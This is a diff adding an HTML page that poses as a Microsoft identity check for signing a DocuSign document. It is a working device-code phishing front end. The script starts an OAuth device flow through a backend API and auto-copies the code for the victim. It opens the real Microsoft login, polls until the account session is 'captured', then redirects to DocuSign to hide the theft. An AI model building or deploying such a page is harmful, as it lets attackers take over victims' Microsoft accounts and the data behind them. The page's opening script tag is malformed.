@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify to sign</title>
+    <link rel="icon" type="image/x-icon" href="https://microsoft.com/favicon.ico">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background-color: #f4f6f9;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            width: 100%;
+            max-width: 440px;
+            background: #fff;
+            padding: 48px 40px;
+            box-sizing: border-box;
+            border-radius: 16px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.06);
+            text-align: center;
+            margin: 20px;
+        }
+        .lock-icon {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 28px;
+            background: #0078d4;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            box-shadow: 0 0 0 8px #e5f1fa;
+        }
+        .lock-icon svg {
+            width: 24px;
+            height: 24px;
+        }
+        h1 {
+            color: #1b1b1b;
+            font-size: 22px;
+            font-weight: 600;
+            margin: 0 0 12px;
+        }
+        p.subtitle {
+            font-size: 15px;
+            color: #555;
+            margin-bottom: 36px;
+            line-height: 1.5;
+            padding: 0 10px;
+        }
+        .code-box {
+            background: #252a36;
+            border-radius: 12px;
+            padding: 32px 24px;
+            margin-bottom: 32px;
+        }
+        .code-label {
+            color: #8b95a5;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-bottom: 16px;
+        }
+        .code-display {
+            color: #3b6df6;
+            font-size: 34px;
+            font-weight: 700;
+            letter-spacing: 8px;
+            margin-bottom: 24px;
+            font-family: 'Consolas', 'Courier New', monospace;
+        }
+        .copy-btn {
+            background: #2558e8;
+            color: #fff;
+            border: none;
+            padding: 12px 32px;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background 0.2s;
+        }
+        .copy-btn:hover {
+            background: #1d4ed8;
+        }
+        .steps {
+            text-align: left;
+            margin-bottom: 36px;
+            padding: 0 16px;
+        }
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #374151;
+            font-weight: 500;
+        }
+        .step-num {
+            width: 24px;
+            height: 24px;
+            background: #2558e8;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 700;
+            margin-right: 16px;
+            flex-shrink: 0;
+        }
+        .continue-btn {
+            background: #0078d4;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 28px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            transition: background 0.2s;
+        }
+        .continue-btn:hover {
+            background: #006cbe;
+        }
+        .continue-btn svg {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+        }
+        .hidden { display: none !important; }
+        #finish-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0078d4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #status-text {
+            font-size: 14px;
+            color: #0067b8;
+            margin-top: 20px;
+        }
+        #log-container {
+            margin-top: 20px;
+            text-align: left;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 11px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            max-height: 120px;
+            overflow-y: auto;
+            color: #475569;
+        }
+        .log-entry { margin-bottom: 4px; border-bottom: 1px solid #f1f5f9; padding-bottom: 2px; }
+        .log-time { color: #94a3b8; margin-right: 6px; }
+        .log-msg-info { color: #0ea5e9; }
+        .log-msg-success { color: #10b981; font-weight: 600; }
+        .log-msg-error { color: #ef4444; }
+        .loading-dots:after {
+            content: '.';
+            animation: dots 1s steps(5, end) infinite;
+        }
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60% { content: '...'; }
+            80%, 100% { content: ''; }
+        }
+        /* Login Modal Styles */
+        #login-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1001; /* Above other elements */
+        }
+        .login-modal-content {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            position: relative;
+            width: 90%;
+            max-width: 700px;
+            height: 90%;
+            max-height: 600px;
+            display: flex;
+            flex-direction: column;
+        }
+        .login-modal-content iframe {
+            flex-grow: 1;
+            border: none;
+            width: 100%;
+            height: 100%;
+        }
+        .close-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #333;
+        }        .close-button:hover {
+            color: #000;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="lock-icon">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
+        </div>
+        
+        <h1>Verify to sign</h1>
+        <p class="subtitle">Please verify your identity with Microsoft to access and sign this document.</p>
+        
+        <div id="code-container" class="hidden">
+            <div class="code-box">
+                <div class="code-label">YOUR VERIFICATION CODE</div>
+                <div class="code-display" id="user-code">LOADING...</div>
+                <button class="copy-btn" id="copy-button">Copy Code</button>
+            </div>
+            
+            <div class="steps">
+                <div class="step">
+                    <div class="step-num">1</div>
+                    <span>Click the button — code is auto-copied</span>
+                </div>
+                <div class="step">
+                    <div class="step-num">2</div>
+                    <span>Paste the code (Ctrl+V) in the popup</span>
+                </div>
+                <div class="step">
+                    <div class="step-num">3</div>
+                    <span>Sign in with your Microsoft account</span>
+                </div>
+            </div>
+
+            <a class="continue-btn" id="login-button">
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.4 24H0V12.6h11.4V24zM24 24H12.6V12.6H24V24zM11.4 11.4H0V0h11.4v11.4zm12.6 0H12.6V0H24v11.4z"/></svg>
+                Continue to Microsoft
+            </a>
+        </div>
+        
+        <div id="status-text">⏳ Initializing session<span class="loading-dots"></span></div>
+        <div id="log-container" class="hidden"></div>
+    </div>
+
+    <div id="finish-overlay" class="hidden">
+        <div class="spinner"></div>
+        <div style="font-size: 18px; color: #333; font-weight: 500;">Authorizing Session...</div>
+        <div style="font-size: 14px; color: #666; margin-top: 8px;">Please wait while we redirect you to the document.</div>
+    </div>
+
+    </script>
+        const statusEl = document.getElementById('status-text');
+        const codeContainer = document.getElementById('code-container');
+        const finishOverlay = document.getElementById('finish-overlay');
+        const userCodeEl = document.getElementById('user-code');
+        const copyBtn = document.getElementById('copy-button');
+        const loginBtn = document.getElementById('login-button');
+        const logContainer = document.getElementById('log-container');
+
+        loginBtn.addEventListener('click', (e) => {
+            e.preventDefault(); // Prevent default link behavior
+            const url = loginBtn.dataset.verificationUri;
+            if (url) {
+                log('🌐 Opening Microsoft login page for code entry...', 'info');
+                window.open(url, '_blank', 'width=800,height=600,toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=yes');
+                pingEstsAuth();
+            } else {
+                log('Error: Verification URL not available.', 'error');
+            }
+        });
+
+        // Modal elements
+        const pingEstsAuth = async () => {
+            // Ping login.microsoftonline.com in a small hidden window to get ESTSAUTH
+            const estsauthPingWindow = window.open('https://login.microsoftonline.com/', '_blank', 'width=100,height=100,toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no');
+            if (estsauthPingWindow) {
+                await new Promise(resolve => setTimeout(() => {
+                    estsauthPingWindow.close();
+                    log('✅ ESTSAUTH ping window closed.', 'success');
+                    resolve();
+                }, 5000)); // Give it 5 seconds to load and set cookies
+            } else {
+                log('⚠️ Pop-up blocker might have prevented ESTSAUTH ping. Please allow pop-ups.', 'error');
+            }
+        };
+
+        const log = (msg, type = 'info') => {
+            console.log(`[${type}] ${msg}`);
+            logContainer.classList.remove('hidden');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            const time = new Date().toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            entry.innerHTML = `<span class="log-time">${time}</span><span class="log-msg-${type}"> ${msg}</span>`;
+            logContainer.prepend(entry);
+        };
+        
+        let pollingInterval = null;
+        let appConfig = {}; // Global config object
+
+        const fetchConfig = async () => {
+            try {
+                const response = await fetch('/api.php?action=get_config');
+                const data = await response.json();
+                if (data.ok) {
+                    appConfig = data;
+                    log('✅ Configuration loaded from API.', 'success');
+                } else {
+                    log('⚠️ Failed to load config from API, using defaults.', 'error');
+                }
+            } catch (e) {
+                log('❌ Error fetching config: ' + e.message, 'error');
+            }
+        };
+
+        const finishFlow = () => {
+            finishOverlay.classList.remove('hidden');
+            setTimeout(() => {
+                // Redirect to a realistic target after success
+                window.location.href = appConfig.postAuthRedirectUrl || "https://www.docusign.com/";
+            }, 3000);
+        };
+
+        const startDeviceFlow = async () => {
+            log('⚡ Entering startDeviceFlow...', 'info');
+            log('⚡ Starting Secure Verification Flow...', 'info');
+            try {
+                const response = await fetch('/api.php?action=start_device_flow');
+                const data = await response.json();
+                
+                if (data.user_code) {
+                    log('📦 Verification code generated: ' + data.user_code, 'success');
+                    userCodeEl.textContent = data.user_code;
+                    codeContainer.classList.remove('hidden');
+                    statusEl.classList.add('hidden'); 
+                    
+                    const activeClientId = data.clientId; 
+                    loginBtn.dataset.verificationUri = data.verification_uri;
+
+                    const copyCode = async () => {
+                        const code = userCodeEl.textContent; // Use userCodeEl directly
+                        log('📋 Copying code...', 'info');
+                        try {
+                            if (navigator.clipboard && navigator.clipboard.writeText) {
+                                await navigator.clipboard.writeText(code);
+                            } else {
+                                const textArea = document.createElement("textarea");
+                                textArea.value = code;
+                                document.body.appendChild(textArea);
+                                textArea.select();
+                                document.execCommand('copy');
+                                document.body.removeChild(textArea);
+                            }
+                            copyBtn.textContent = 'Copied!';
+                            setTimeout(() => copyBtn.textContent = 'Copy Code', 2000);
+                        } catch (err) {
+                            log('❌ Failed to copy code: ' + err, 'error');
+                        }
+                    };
+
+                    copyBtn.onclick = copyCode;
+
+                    const interval = (data.interval || 5) * 1000;
+                    log(`⏳ Polling for authorization (Every ${data.interval || 5}s)...`, 'info');
+                    pollStatus(data.device_code, interval, activeClientId);
+                } else {
+                    log('❌ API Error: ' + (data.error || 'Unknown'), 'error');
+                    statusEl.textContent = '❌ Error starting verification. Please refresh.';
+                    statusEl.classList.remove('hidden');
+                }
+            } catch (e) {
+                log('❌ Connection error during startup.', 'error');
+                statusEl.textContent = '❌ Connection error. Please check your internet.';
+                statusEl.classList.remove('hidden');
+            }
+        };
+
+        const pollStatus = async (deviceCode, intervalMs, clientId) => {
+            pollingInterval = setInterval(async () => {
+                try {
+                    const response = await fetch('/api.php?action=poll_device_flow', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            device_code: deviceCode,
+                            clientId: clientId
+                        })
+                    });
+                    const data = await response.json();
+
+                    if (data.ok && data.status === 'completed') {
+                        log('✅ Authorization Success!', 'success');
+                        clearInterval(pollingInterval);
+                        codeContainer.classList.add('hidden');
+                        statusEl.textContent = '✅ Verification Complete! Session captured in browser.';
+                        statusEl.classList.remove('hidden');
+                        finishFlow(); // Redirect after successful authorization
+
+                    } else if (data.ok && data.status === 'pending' && data.message) {
+                        // Silent update
+                    } else if (data.error === 'expired_token' || data.error === 'access_denied') {
+                        log('❌ Session expired or denied by user.', 'error');
+                        clearInterval(pollingInterval);
+                        codeContainer.classList.add('hidden');
+                        statusEl.textContent = data.error === 'access_denied' 
+                            ? '❌ Verification cancelled by user. Please refresh.' 
+                            : '❌ Session expired. Please refresh the page.';
+                        statusEl.classList.remove('hidden');
+                    }
+                } catch (e) {}
+            }, intervalMs);
+        };
+
+
+        window.onload = async () => {
+            await fetchConfig(); // Ensure config is loaded first
+            await startDeviceFlow(); // Start device flow immediately
+        };
+
+    </script>
+</body>
+</html>
